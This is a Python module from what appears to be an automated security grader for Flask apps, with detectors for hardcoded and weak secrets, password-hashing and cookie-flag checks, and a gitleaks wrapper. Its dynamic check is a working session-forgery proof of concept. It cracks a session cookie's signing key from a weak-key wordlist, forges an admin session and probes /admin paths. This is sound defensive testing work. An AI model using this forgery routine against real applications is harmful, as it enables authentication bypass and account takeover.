"""A04 Cryptographic Failures: hardcoded/weak secrets (report-only), password
hashing, cookie flags, the gitleaks secret scan, and the live session-forgery PoC
(the only secret finding that deducts: a critical when the forgery succeeds).
"""
from __future__ import annotations

import ast
import os
import re
from typing import Any, Dict, List, Optional, Tuple

import requests

from ..shared.external_tools import (
    _SKIP_REASON, _gate, _run_json, _skipped, _stub_command, _tool_cfg,
)
from ..shared.http import _body_text, _json_or_none, _looks_like_admin, _snip
from ..shared.sources import _iter_lines, _joined
from .base import Check, _undecidable, result


# ── hardcoded_secret  (static) — *_KEY / secret_key assigned a string literal.
# Handles NAME=, app.secret_key=, config['SECRET_KEY']=, app.config[...]=, NAME:.
_SECRET_LHS = re.compile(
    r"""
    (?P<lhs>
        (?:[A-Za-z_][\w.]*\.)?
        (?:
            (?:SECRET_KEY|secret_key)
          | (?:config\s*\[\s*['"]SECRET_KEY['"]\s*\])
          | (?:\[\s*['"]SECRET_KEY['"]\s*\])
        )
    )
    \s*[:=]\s*
    (?P<rhs>.+)$
    """,
    re.VERBOSE,
)
_ENV_REF = re.compile(
    r"""(os\.)?environ\s*(\[|\.get\s*\()|(os\.)?getenv\s*\(""",
    re.VERBOSE,
)
_STR_LITERAL = re.compile(r"""^\s*[a-zA-Z]?['"]""")


def check_hardcoded_secret(check, sctx, cfg):
    penalty = float(cfg.get("penalty_per_finding", 100))
    allow_env = bool(cfg.get("allow_env_reference", True))

    reasons: List[str] = []
    evidence: List[str] = []
    for path, lineno, line in _iter_lines(sctx.sources):
        m = _SECRET_LHS.search(line)
        if not m:
            continue
        rhs = m.group("rhs").strip()
        if allow_env and _ENV_REF.search(rhs):
            continue
        if not _STR_LITERAL.match(rhs):
            continue
        reasons.append(f"{path}:{lineno} SECRET_KEY 하드코딩")
        evidence.append(f"{path}:{lineno}: {line.strip()}")
    # The harvested .env ships with the app and the sandbox loads it into the
    # environment (sandbox/sitecustomize.py), so a value there is a key in the source.
    dotenv = os.path.join(sctx.app_dir, ".env") if sctx.app_dir else None
    for lineno, key, value in _dotenv_entries(dotenv) if dotenv else []:
        if "SECRET" in key.upper() and value:
            reasons.append(f".env:{lineno} {key} 하드코딩")
            evidence.append(f".env:{lineno}: {key}=…")

    return result(check, cfg, score=100.0 - penalty * len(reasons),
                  passed=not reasons, reasons=reasons, evidence=evidence)


def _dotenv_entries(path: str) -> List[Tuple[int, str, str]]:
    """(line, key, value) as sandbox/sitecustomize.py reads them."""
    try:
        with open(path, encoding="utf-8") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return []
    out = []
    for i, raw in enumerate(lines, start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("export "):
            line = line[len("export "):].lstrip()
        key, sep, value = line.partition("=")
        key = key.strip()
        if not sep or not key.replace("_", "").isalnum():
            continue
        value = value.strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
            value = value[1:-1]
        else:
            value = value.split(" #", 1)[0].rstrip()
        out.append((i, key, value))
    return out


# ── weak_default_secret  (static) — os.environ.get("SECRET_KEY", "<literal>")
# fallback, which hardcoded_secret skips because it sees an env reference. Match
# only SESSION-SIGNING key names (must contain SECRET) — NOT arbitrary "KEY"/
# "PASSWORD" env vars like ADMIN_PASSWORD / API_KEY, whose weak default is a
# different (and lesser) issue and must not trip the session-forgery critical.
_WEAK_DEFAULT = re.compile(
    # os.environ.get("SECRET_KEY", "dev") and os.environ.get("SECRET_KEY") or "dev"
    r"""(?:environ\.get|getenv)\s*\(\s*['"][^'"]*SECRET[^'"]*['"]\s*(?:,\s*|\)\s*or\s*)(?P<def>['"][^'"]*['"])""",
    re.IGNORECASE,
)


def check_weak_default_secret(check, sctx, cfg):
    reasons: List[str] = []
    evidence: List[str] = []
    for path, text in sctx.sources:
        for m in _WEAK_DEFAULT.finditer(text):
            default = m.group("def").strip("'\"")
            if not default:
                continue  # empty fallback => still needs env, acceptable
            lineno = text.count("\n", 0, m.start()) + 1
            reasons.append(f"{path}:{lineno} 환경변수 미설정 시 하드코딩된 기본 SECRET_KEY로 fallback")
            evidence.append(f"{path}:{lineno}: {m.group(0)[:120]}")
    if reasons:
        return result(check, cfg, score=cfg.get("score_weak", 0), passed=False,
                      reasons=reasons, evidence=evidence)
    return result(check, cfg, score=cfg.get("score_ok", 100), passed=True)


# ── password_hashing  (static) ─────────────────────────────────────────────
_STRONG_HASH = re.compile(
    r"""bcrypt|argon2|scrypt|pbkdf2|generate_password_hash|check_password_hash|passlib""",
    re.IGNORECASE,
)
# A bare digest call is a fast, unsalted hash — md5/sha1 and the sha2/sha3/blake2
# family alike. ``pbkdf2_hmac('sha256', ...)`` names the digest as a string, not a
# call, so it doesn't match here and counts as strong.
_WEAK_HASH = re.compile(r"""\b(md5|sha1|sha224|sha256|sha384|sha512|sha3_\d+|blake2[bs])\s*\(""", re.IGNORECASE)
# ``secrets.`` is the random module (OTP codes are hashed with it), not a credential.
_PW_TOKEN = re.compile(r"""pass|pwd|\bpw\b|password|secret(?!s\.)|credential""", re.IGNORECASE)
_STRONG_CALL = re.compile(r"""(?<![\w.])(?<!def )[\w.]*(?:bcrypt|argon2|scrypt|pbkdf2|password_hash|passlib)\w*\s*\(""", re.IGNORECASE)
_SQL_PW_WRITE = re.compile(r"""\b(?:INSERT|UPDATE)\b.*\b(?:password|passwd|pwd|pw)(?:_?hash)?\b""", re.IGNORECASE)
_QUOTED = re.compile(r"""(?:[rbfu]{0,2})("[^"\n]*"|'[^'\n]*')""", re.IGNORECASE)


def _hash_arg(line: str, start: int) -> str:
    """Text inside the call parens that open at ``line[start - 1]``."""
    depth = 1
    for i in range(start, len(line)):
        depth += {"(": 1, ")": -1}.get(line[i], 0)
        if depth == 0:
            return line[start:i]
    return line[start:]


def _hashes_password(line: str) -> bool:
    """A fast-hash line hashes a password when, in the statement that holds the
    hash call, a call's argument names one, or the code outside string literals and
    strong-hash calls does. A reset token hashed next to a print of
    ``/password/reset`` or a ``generate_password_hash`` call is not a password hash;
    an SQL string that writes a password column is kept as code."""
    masked = _QUOTED.sub(lambda m: "x" * len(m.group(0)), line)
    cuts = [-1, *(i for i, ch in enumerate(masked) if ch == ";"), len(line)]
    stmts = (line[a + 1:b] for a, b in zip(cuts, cuts[1:]))
    return any(_stmt_hashes_password(s) for s in stmts if _WEAK_HASH.search(s))


def _stmt_hashes_password(stmt: str) -> bool:
    if any(_PW_TOKEN.search(_hash_arg(stmt, m.end())) for m in _WEAK_HASH.finditer(stmt)):
        return True
    rest = _QUOTED.sub(lambda m: m.group(0) if _SQL_PW_WRITE.search(m.group(0)) else '""', stmt)
    while m := _STRONG_CALL.search(rest):
        rest = rest[:m.start()] + rest[m.end() + len(_hash_arg(rest, m.end())) + 1:]
    return bool(_PW_TOKEN.search(rest))


# Plaintext password comparison against a STORED credential, e.g.
# ``user.password == pw`` or ``row['password'] == pw``. A bare ``password ==
# confirm`` (signup confirmation) is NOT stored-credential access, so it no longer
# false-positives as a plaintext compare.
_STORED_PW = r"""(?:\w+\s*\.\s*(?:password|passwd)\b|\[\s*['"](?:password|passwd)['"]\s*\])"""
_PLAINTEXT_CMP = re.compile(
    rf"""{_STORED_PW}\s*==|==\s*{_STORED_PW}""",
    re.IGNORECASE,
)


# A fast hash counts as salted only when the line mixes in a ``salt`` drawn per user
# from a random source. ``sha256(app.secret_key + pw)`` is one value for every user.
_SALT_NAME = re.compile(r"""\bsalt\w*\b""", re.IGNORECASE)
_RANDOM_SALT = re.compile(r"""\bsalt\w*\s*=\s*(?:secrets\.|os\.urandom|uuid\.)""", re.IGNORECASE)
_FIXED_SALT = re.compile(r"""secret(?!s\.)|config|environ|getenv""", re.IGNORECASE)
_KDF_SALT_POS = {"pbkdf2_hmac": 2}   # hashlib.scrypt takes salt keyword-only


def _call_name(node: ast.Call) -> str:
    f = node.func
    return f.attr if isinstance(f, ast.Attribute) else f.id if isinstance(f, ast.Name) else ""


def _arg(node: ast.Call, pos: Optional[int], kw: str):
    for k in node.keywords:
        if k.arg == kw:
            return k.value
    if pos is not None and len(node.args) > pos:
        return node.args[pos]
    return None


def _is_fixed(expr, assigns: Dict[str, List[ast.AST]]) -> bool:
    """A literal or an app-wide value (SECRET_KEY, config, env). A plain name is fixed
    only if every assignment to it is; a stored salt read back is not."""
    if isinstance(expr, ast.Constant):
        return True
    if isinstance(expr, ast.Name):
        vals = assigns.get(expr.id) or []
        return bool(vals) and all(_is_fixed(v, {}) for v in vals)
    return bool(_FIXED_SALT.search(ast.unparse(expr)))


def _kdf_findings(sources, min_iter: int) -> List[Tuple[str, int, str]]:
    found: List[Tuple[str, int, str]] = []
    for path, text in sources:
        try:
            tree = ast.parse(text)
        except SyntaxError:
            continue
        assigns: Dict[str, List[ast.AST]] = {}
        for n in ast.walk(tree):
            if isinstance(n, ast.Assign):
                for t in n.targets:
                    if isinstance(t, ast.Name):
                        assigns.setdefault(t.id, []).append(n.value)
        for n in ast.walk(tree):
            if not isinstance(n, ast.Call) or _call_name(n) not in ("scrypt", "pbkdf2_hmac"):
                continue
            name = _call_name(n)
            salt = _arg(n, _KDF_SALT_POS.get(name), "salt")
            if salt is not None and _is_fixed(salt, assigns):
                found.append((path, n.lineno, "모든 사용자에게 같은 솔트"))
            if name == "pbkdf2_hmac":
                it = _arg(n, 3, "iterations")
                if isinstance(it, ast.Constant) and isinstance(it.value, int) and it.value < min_iter:
                    found.append((path, n.lineno, f"pbkdf2 반복 {it.value:,}회"))
    return found


def check_password_hashing(check, sctx, cfg):
    score_strong = float(cfg.get("score_strong", 100))
    score_fixed_kdf = float(cfg.get("score_weak_kdf", 60))
    score_salted = float(cfg.get("score_salted_fast_hash", 30))
    score_weak = float(cfg.get("score_weak_hash", 15))
    score_plain = float(cfg.get("score_plaintext", 0))
    score_unknown = float(cfg.get("score_unknown", 60))

    strong_ev: List[str] = []
    weak_ev: List[Tuple[str, int, str]] = []
    plain_ev: List[str] = []
    for path, lineno, line in _iter_lines(sctx.sources):
        if _STRONG_HASH.search(line):
            strong_ev.append(f"{path}:{lineno}: {line.strip()}")
        wm = _WEAK_HASH.search(line)
        if wm and _hashes_password(line):
            weak_ev.append((path, lineno, line.strip()))
        if _PLAINTEXT_CMP.search(line):
            plain_ev.append(f"{path}:{lineno}: {line.strip()}")

    # Precedence: plaintext compare worst, then fast hash, then a weak KDF, then strong.
    if plain_ev:
        return result(check, cfg, score=score_plain, passed=False,
                      reasons=[f"{e.split(':', 2)[0]}:{e.split(':', 2)[1]} 평문 비밀번호 비교"
                               for e in plain_ev],
                      evidence=plain_ev)
    if weak_ev:
        random_salt = bool(_RANDOM_SALT.search(_joined(sctx.sources)))
        salted = random_salt and all(_SALT_NAME.search(line) for _, _, line in weak_ev)
        what = "솔트를 붙인 빠른 해시" if salted else "솔트 없는 빠른 해시"
        return result(check, cfg, score=score_salted if salted else score_weak, passed=False,
                      reasons=[f"{path}:{lineno} 비밀번호에 {what} 사용" for path, lineno, _ in weak_ev],
                      evidence=[f"{path}:{lineno}: {line}" for path, lineno, line in weak_ev])
    kdf = _kdf_findings(sctx.sources, int(cfg.get("min_pbkdf2_iterations", 100000)))
    if kdf:
        return result(check, cfg, score=score_fixed_kdf, passed=False,
                      reasons=[f"{path}:{lineno} 비밀번호 KDF에 {what}" for path, lineno, what in kdf],
                      evidence=strong_ev)
    if strong_ev:
        return result(check, cfg, score=score_strong, passed=True, evidence=strong_ev)
    return result(check, cfg, score=score_unknown, passed=score_unknown >= 60,
                  reasons=["명확한 비밀번호 해싱 로직을 찾지 못함"])


# ── cookie_flags  (static) ─────────────────────────────────────────────────
_COOKIE_FLAGS = {
    "SESSION_COOKIE_HTTPONLY": "HttpOnly",
    "SESSION_COOKIE_SECURE": "Secure",
    "SESSION_COOKIE_SAMESITE": "SameSite",
}
# Flask sets the session cookie HttpOnly by DEFAULT, so an app using Flask sessions
# already has HttpOnly unless it explicitly turns it off — don't penalize it.
_FLASK_SESSION = re.compile(r"""from\s+flask\s+import[^\n]*\bsession\b|\bsession\s*\[|flask\.session""", re.IGNORECASE)
_HTTPONLY_OFF = re.compile(r"""SESSION_COOKIE_HTTPONLY['"\]\s]*[=:]\s*False""", re.IGNORECASE)
# A flag NAME present but set to a disabling value is NOT protection. `Secure=False`
# is the common one (apps disable it to work over plain HTTP) — crediting it just
# because the string appears is a false positive (the flag is off). SameSite=None
# (or False) likewise removes the cross-site restriction. HttpOnly keeps its own
# `_HTTPONLY_OFF` (Flask defaults it on, so only an explicit False disables it).
_SECURE_OFF = re.compile(r"""SESSION_COOKIE_SECURE['"\]\s]*[=:]\s*False""", re.IGNORECASE)
_SAMESITE_OFF = re.compile(r"""SESSION_COOKIE_SAMESITE['"\]\s]*[=:]\s*(?:False|None|['"]None['"])""", re.IGNORECASE)
_FLAG_OFF = {"Secure": _SECURE_OFF, "SameSite": _SAMESITE_OFF}


def check_cookie_flags(check, sctx, cfg):
    baseline = float(cfg.get("baseline", 25))
    per_flag = float(cfg.get("score_per_flag", 25))

    joined = _joined(sctx.sources)
    httponly_off = bool(_HTTPONLY_OFF.search(joined))
    uses_flask_session = bool(_FLASK_SESSION.search(joined))
    present = []
    evidence: List[str] = []
    for flag, label in _COOKIE_FLAGS.items():
        explicit = bool(re.search(re.escape(flag), joined))
        if label == "HttpOnly":
            # Present if explicitly set OR Flask-session default — unless disabled.
            if not httponly_off and (explicit or uses_flask_session):
                present.append(label)
                evidence.append(flag if explicit else "Flask 세션 기본값(HttpOnly=True)")
        elif explicit and not (label in _FLAG_OFF and _FLAG_OFF[label].search(joined)):
            # The name appears AND is not set to a disabling value (False/None).
            present.append(label)
            evidence.append(flag)

    missing = [lbl for lbl in _COOKIE_FLAGS.values() if lbl not in present]
    reasons = [f"세션 쿠키 {m} 플래그 미설정" for m in missing]
    return result(check, cfg, score=baseline + per_flag * len(present),
                  passed=not missing, reasons=reasons, evidence=evidence)


# ── gitleaks_secrets  (static) — hardcoded-secret corroboration (report-only).
def check_gitleaks_secrets(check, sctx, cfg):
    config = sctx.config
    tcfg = _tool_cfg(config, "gitleaks")
    bin_path, skip = _gate(config, "gitleaks")
    if bin_path is None:
        return _skipped(check.id, check.label, "gitleaks", skip or _SKIP_REASON)

    cmd = _stub_command(bin_path) + [
        "detect", "--no-git", "--report-format", "json",
        "--report-path", "/dev/stdout", "--source", sctx.app_dir,
    ]
    data = _run_json(cmd, float(tcfg.get("timeout", 60)))
    if data is None:
        data = []  # ran but nothing parseable => treat as clean

    reasons, evidence = _parse_gitleaks(data)
    return result(check, cfg, score=0.0 if reasons else 100.0, passed=not reasons,
                  reasons=reasons, evidence=evidence, tool="gitleaks")


def _parse_gitleaks(data: object) -> Tuple[List[str], List[str]]:
    reasons: List[str] = []
    evidence: List[str] = []
    findings = data if isinstance(data, list) else data.get("findings", []) if isinstance(data, dict) else []
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        rule = f.get("RuleID") or f.get("Description") or "secret"
        file_ = f.get("File", "")
        line = f.get("StartLine", "")
        loc = f"{file_}:{line}" if file_ else ""
        reasons.append(f"{loc} {rule} 시크릿 탐지".strip())
        secret = f.get("Secret", "")
        evidence.append(f"{loc}: {rule} {secret}".strip())
    return reasons, evidence


# ── session_forgery  (dynamic) — LIVE PoC for a guessable SECRET_KEY.
# An outside attacker does not see the source, so it forges only with the PUBLIC
# weak-key wordlist (probes.weak_secrets), never with values read from the app.
# A forged Flask session that reaches /admin as the first (admin) user is the
# critical itself (weight 0: it costs the critical penalty, not category points).
# Needs flask importable on the grader host.
def dynamic_session_forgery(check, ctx, cfg):
    secrets = [s for s in (ctx.config.get("probes.weak_secrets", []) or []) if s]
    if not secrets:
        return _undecidable(check, cfg, "시도할 시크릿 없음 · 약한 시크릿 목록이 비어 있음")
    fid = int(cfg.get("forge_user_id", 1))
    # The first signup is the admin: an app with opaque (UUID) ids has no user 1.
    admin_id = getattr(getattr(ctx, "userA", None), "user_id", None)
    if admin_id is not None:
        # An id found in a page link is a string: "1" is the number 1.
        fid = int(admin_id) if str(admin_id).isdigit() else admin_id
    paths = list(cfg.get("admin_paths", ["/admin", "/admin/users"]))
    # Forge several common session-key shapes so it works across apps.
    payload = {"user_id": fid, "uid": fid, "id": fid, "logged_in": True,
               "is_admin": True, "admin": True, "role": "admin"}

    if _forge_flask_cookie(secrets[0], payload) is None:
        return _undecidable(check, cfg,
                            "flask 미설치로 세션 위조 검증 불가")
    # As flask-unsign does: the attacker's own session cookie is readable, so the key
    # is found offline by checking its signature against the wordlist, and the forged
    # cookie keeps the app's own fields (e.g. a session version) with every user-id
    # field set to the admin's (_with_id).
    # Without this an app that checks such a field rejects every generic shape.
    own = _own_session(ctx, secrets)
    if own is not None:
        secrets = [own[0]]
        # The app's own fields, the generic admin flags over them, and every id
        # field set to the admin's in the app's own type (a "2" stays a string).
        member_id = getattr(getattr(ctx, "userB", None), "user_id", None)
        # Only the id fields actually swapped: one left as the test user's own would
        # override the generic admin id below and forge the test user again.
        swapped = _with_id(own[1], fid, member_id)
        ids = {k: v for k, v in swapped.items() if v != own[1].get(k)}
        payload = {**own[1], **payload, **ids}
    cookie_name = own[2] if own is not None else None
    member = getattr(getattr(ctx, "userB", None), "session", None)

    answered = True
    for path in paths:
        # Only attribute to forgery if the path is NOT already open without a cookie,
        # or to the non-admin test user as is: access_control_admin owns that.
        if any(_admin_page(ctx.get(sess, path))
               for sess in (requests.Session(), member) if sess is not None):
            continue
        for secret in secrets:
            forged = _forge_flask_cookie(secret, payload)
            if forged is None:
                continue
            name, value = forged
            name = cookie_name or name  # the app's own session cookie name
            sess = requests.Session()
            sess.cookies.set(name, value)
            r = ctx.get(sess, path)
            if r is None:
                answered = False
            elif r.status_code == 200 and _looks_like_admin(
                _body_text(r), _json_or_none(r)
            ):
                return result(check, cfg, score=cfg.get("score_forged", 0), passed=False,
                              reasons=[f"알려진 약한 시크릿 {secret!r}로 세션 쿠키를 위조해 user_id={fid}(admin) "
                                       f"권한으로 {path} 접근 성공 → 인증 우회·계정 탈취 가능"],
                              evidence=[_snip(f"forged {name}={value}"),
                                        _snip(f"{path} -> 200 (admin 콘텐츠 렌더)")],
                              tool="flask-session-forge")
    if not answered and own is None:
        return _undecidable(check, cfg, "위조 쿠키 요청에 응답이 없어 판정 불가")
    if own is not None:
        # The key is public, but no admin page opened with it: a finding, not a
        # proven takeover.
        return result(check, cfg, score=cfg.get("score_forged", 0), passed=False, unproven=True,
                      reasons=[f"세션 쿠키가 알려진 약한 시크릿 {own[0]!r}로 서명됨, 관리자 세션 위조는 확인 못 함"],
                      evidence=[_snip(f"테스트 사용자 세션 쿠키 서명이 {own[0]!r}로 검증됨")],
                      tool="flask-session-forge")
    return result(check, cfg, score=cfg.get("score_safe", 100), passed=True,
                  evidence=[_snip(f"{len(secrets)}종 기본 시크릿으로 위조 시도 → 관리자 접근 실패(서명 검증 정상)")],
                  tool="flask-session-forge")


def _admin_page(r) -> bool:
    return r is not None and r.status_code == 200 and _looks_like_admin(_body_text(r), _json_or_none(r))


# Session keys that hold the logged-in user's id. Not ``sid``/``session_id`` (a
# server-side session id) nor Flask-Login's ``_id`` (a hash of the client).
_ID_KEYS = frozenset({"user_id", "_user_id", "userid", "uid", "id", "account_id",
                      "member_id", "user", "sub"})


def _with_id(data: Dict[str, Any], uid: Any, own_id: Any = None) -> Dict[str, Any]:
    """``data`` with every user-id field set to ``uid``, in the field's own type. A
    field counts only when its value is an id: a number, a string of digits, or the
    test user's own id (an opaque id). A username under ``user`` stays as it is."""
    out = dict(data)
    for key, value in data.items():
        if key.lower() not in _ID_KEYS or isinstance(value, bool):
            continue
        if isinstance(value, int):
            if str(uid).isdigit():
                out[key] = int(uid)
        elif isinstance(value, str) and (value.isdigit() or (own_id is not None and value == str(own_id))):
            out[key] = str(uid)
    return out


def _own_session(ctx, secrets: List[str]) -> Optional[Tuple[str, Dict[str, Any], str]]:
    """(weak key, decoded payload, cookie name) of the non-admin test user's own
    Flask session cookie when one of ``secrets`` verifies its signature, else None.
    Every cookie is tried: an app may rename its session cookie."""
    acct = getattr(ctx, "userB", None)
    cookies = [(c.name, c.value) for c in acct.session.cookies] if acct is not None else []
    if not cookies:
        return None
    try:
        from flask import Flask
        from flask.sessions import SecureCookieSessionInterface
    except Exception:
        return None
    for secret in secrets:
        app = Flask(__name__)
        app.secret_key = secret
        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
        for name, value in cookies:
            try:
                data = serializer.loads(value)
            except Exception:
                continue
            if isinstance(data, dict):
                return secret, data, name
    return None


def _forge_flask_cookie(secret: str, payload: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """Return (cookie_name, signed_value) for a Flask session forged with ``secret``,
    or None if Flask isn't importable / signing fails."""
    try:
        from flask import Flask
        from flask.sessions import SecureCookieSessionInterface
    except Exception:
        return None
    try:
        app = Flask(__name__)
        app.secret_key = secret
        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
        if serializer is None:
            return None
        name = app.config.get("SESSION_COOKIE_NAME", "session")
        return name, serializer.dumps(dict(payload))
    except Exception:
        return None


CHECKS = [
    Check("hardcoded_secret", "Hardcoded Secret", "static", check_hardcoded_secret),
    Check("weak_default_secret", "Weak SECRET_KEY", "static", check_weak_default_secret),
    Check("password_hashing", "비밀번호 해싱", "static", check_password_hashing),
    Check("cookie_flags", "쿠키 보안 플래그", "static", check_cookie_flags),
    Check("gitleaks_secrets", "gitleaks", "static", check_gitleaks_secrets,
          cfg_path="tools", report_only=True),
    Check("session_forgery", "Session Forgery", "dynamic",
          dynamic_session_forgery),
]
